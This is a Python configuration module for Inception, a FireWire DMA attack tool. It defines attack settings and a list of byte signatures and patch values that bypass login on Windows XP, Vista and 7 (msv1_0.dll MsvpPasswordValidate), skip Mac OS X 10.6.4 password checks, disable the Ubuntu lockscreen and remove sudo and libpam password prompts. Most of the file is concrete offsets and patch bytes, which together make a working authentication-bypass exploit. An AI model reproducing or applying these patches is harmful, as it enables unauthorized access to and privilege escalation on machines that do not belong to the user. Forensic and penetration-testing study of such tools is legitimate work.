'''
Created on Sep 6, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''
#===============================================================================
# Configuration file with signatures - not in use at the moment
#===============================================================================
configfile = 'config.json'

#===============================================================================
# Constants
#===============================================================================
KiB = 1024                          # One KibiByte
MiB = 1024 * KiB                    # One MebiByte
GiB = 1024 * MiB                    # One GibiByte
PAGESIZE = 4 * KiB                  # For the sake of this tool, always the case
OUICONF = 'data/oui.txt'            # FireWire OUI database relative to package
WINDOWS = 1
LINUX = 2
OSX = 3

    
#===============================================================================
# Global variables/defaults/settings
#===============================================================================
verbose = False                 # Not verbose
fw_delay = 15                   # 15 seconds delay before attacking
filemode = False                # Search in file instead of FW DMA
dry_run = False                 # No write-back into memory
target = False                  # No target set
filename = ''                   # No filename set per default
buflen = 15                     # Buffer length for checking if we get data
memsize = 4 * GiB               # 4 GiB, theoretical FW max
success = True                  # Optimistic-by-nature setting
encoding = None                 # System encoding
vectorsize = 128                # Read vector size
memdump = False                 # Memory dump mode off
startaddress = 0x00000000       # Default memory start address
dumpsize = False                # Not set by default
interactive = False             # Interactive mode off
max_request_size = PAGESIZE//2  # By default the max request size is the PSZ/2
override = False                # By default, avoid access Upper Memory
avoid = [0xa0000, 0xfffff]      # Upper Win memory area (can cause BSOD if accessed)
apple_avoid = [0x0, 0xff000]    # Avoid this area if dumping memory from Macs
apple = False                   # Set to true if we are attacking a Mac
pickpocket = False              # Pickpocket
polldelay = 5                   # 5 seconds delay between FireWire delays

#===============================================================================
# List of patterns that signify out of memory bounds reads
#===============================================================================
outofbounds = [0xff * max_request_size,
               0x00 * max_request_size]

#===============================================================================
# Targets are collected in a list of dicts using the following syntax:
# [{'OS': 'OS 1 name' # Used for matching and OS guessing
#  'versions': ['SP0', 'SP2'],
#  'architecture': 'x86',
#  'name': 'Target 1 name',
#  'notes': 'Target 1 notes',
#  'signatures': [
#                 # 1st signature. Signatures are in an ordered list, and are
#                 # searched for in the sequence listed. If not 'keepsearching'
#                 # key is set, the tool will stop at the first match & patch.
#                 {'offsets': 0x00, # Relative to page boundary
#                  'chunks': [{'chunk': 0x00, # Signature to search for
#                              'internaloffset': 0x00, # Relative to offset
#                              'patch': 0xff, # Patch data
#                              'patchoffset': 0x00}]}, # Patch at an offset
#                 # 2nd signature. Demonstrates use of several offsets that
#                 # makes it easier to match signatures where the offset change
#                 # often. Also demonstrates split signatures; where the tool
#                 # matches that are split over several blobs of data. The
#                 # resulting patch below is '0x04__05' where no matching is
#                 # done for the data represented by '__'.
#                 {'offsets': [0x01, 0x02], # Signatures can have several offs
#                  'chunks': [{'chunk': 0x04, # 1st part of signature
#                              'internaloffset': 0x00,
#                              'patch': 0xff, # Patch data for the 1st part
#                              'patchoffset': 0x03}, # Patch at an offset
#                             {'chunk': 0x05, # 2nd part of signature
#                              'internaloffset': 0x02, # Offset relative to sig
#                              'patch': 0xff}]}]}] # Patch data for the 2nd part
#
# Key 'patchoffset' is optional and will be treated like 'None' if not 
# provided.
#
# OS key should follow the rudimentary format 'Name Version'
#
# Example signature with graphical explanation:
#
# 'signatures': [{'offsets': 0x01,
#                          'chunks': [{'chunk': 0xc60f85,
#                                      'internaloffset': 0x00},
#                                     {'chunk': 0x0000b8,
#                                      'internaloffset': 0x05,
#                                      'patch': 0xb001,
#                                      'patchoffset': 0x0a}]}]},
# 
# EQUALS:
#
#   |-- Offset 0x00                     
#  /                                           
# /\             |-patchoffset--------------->[b0 01]   
# 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f .. (byte offset)
# -----------------------------------------------
# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00 .. (chunk of memory data)
# -----------------------------------------------
# \______/ \___/ \______/
#     \      \       \
#      \      \       |-- Chunk 2 at internaloffset 0x05
#       \      |-- Some data (ignore, don't match this)
#        |-- Chunk 1 at internaloffset 0x00
# \_____________________/
#            \
#             |-- Entire signature
#
#===============================================================================

targets=[{'OS': 'Windows 7',
          'versions': ['SP0', 'SP1'],
          'architectures': ['x32', 'x64'],
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64 SP0-SP1
                          'chunks': [{'chunk': 0xc60f85,
                                      'internaloffset': 0x00,
                                      'patch': 0x909090909090,
                                      'patchoffset': 0x01},
                                     {'chunk': 0xb8,
                                      'internaloffset': 0x07}]},
                         {'offsets': [0x926], #x86 SP0
                          'chunks': [{'chunk': 0x83f8107513b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x312], #x86 SP1
                          'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f810909090909090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Windows Vista',
          'versions': ['SP0'],
          'architectures': ['x86'],
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
          'signatures': [{'offsets': [0x432, 0x80f],
                          'chunks': [{'chunk': 0x83f8107513b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Windows XP',
          'versions': ['SP2', 'SP3'],
          'architectures': ['x86'],
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
          'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                          'chunks': [{'chunk': 0x83f8107511b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Mac OS X',
          'versions': ['10.6.4'],
          'architectures': ['x64'],
          'name': 'DoShadowHashAuth technique',
          'notes': 'Short circuits the password validation function, causing all login attempts to succeed.',
          'signatures': [{'offsets': [0x7cf],
                          'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
                                      'internaloffset': 0x00,
                                      'patch': 0x41bf0000000048c78588}]}]},
         {'OS': 'Ubuntu',
          'versions': ['9.04', '10.10', '11.04', '11.10'],
          'architectures': ['x32', 'x64', 'x64', 'x32'],
          'name': 'Gnome lockscreen unlock (experimental)',
          'notes': 'Disables Ubuntu lockscreen.',
          'signatures': [{'offsets': [0xd3f],
                          'chunks': [{'chunk': 0xe8cc61000085c00f85e4000000c74424100e460508c744240c14460508c744240827010000c74424042d,
                                      'internaloffset': 0x00,
                                      'patch': 0xb80100000085}]},
                         {'offsets': [0xa0b, 0x3ab],
                          'chunks': [{'chunk': 0x4189c485ed7407,
                                      'internaloffset': 0x00,
                                      'patch': 0x4531e4,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x6bb],
                          'chunks': [{'chunk': 0x89c54585e47408,
                                      'internaloffset': 0x00,
                                      'patch': 0x31ed,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0xde0],
                          'chunks': [{'chunk': 0xfc9effff89c385ff,
                                      'internaloffset': 0x00,
                                      'patch': 0x31db,
                                      'patchoffset': 0x03}]}]},
         {'OS': 'Ubuntu - sudo (experimental)',
          'versions': ['10.10', '11.10'],
          'architectures': ['x64', 'x32'],
          'name': 'Ubuntu sudo privilege escalation',
          'notes': 'Open a terminal at the target, and run sudo -s. Run inception. After running, sudo -s will work with no password.',
          'signatures': [{'offsets': [0xc15],
                          'chunks': [{'chunk': 0x89c2664189442402,
                                      'internaloffset': 0x00,
                                      'patch': 0x33c0,
                                      'patchoffset': 0x00}]},
                         {'offsets': [0x11c],
                          'chunks': [{'chunk': 0x89c20fbfe8668943,
                                      'internaloffset': 0x00,
                                      'patch': 0x33c0,
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Ubuntu - libpam (experimental)',
          'versions': ['11.10'],
          'architectures': ['x32'],
          'name': 'Ubuntu libpam privilege escalation',
          'notes': 'After running, login and sudo -s will work with no password.',
          'signatures': [{'offsets': [0xbaf],
                          'chunks': [{'chunk': 0x83F81F89C774,
                                      'internaloffset': 0x00,
                                      'patch': 0xBF33ED0000EB,
                                      'patchoffset': 0x00}]}]}]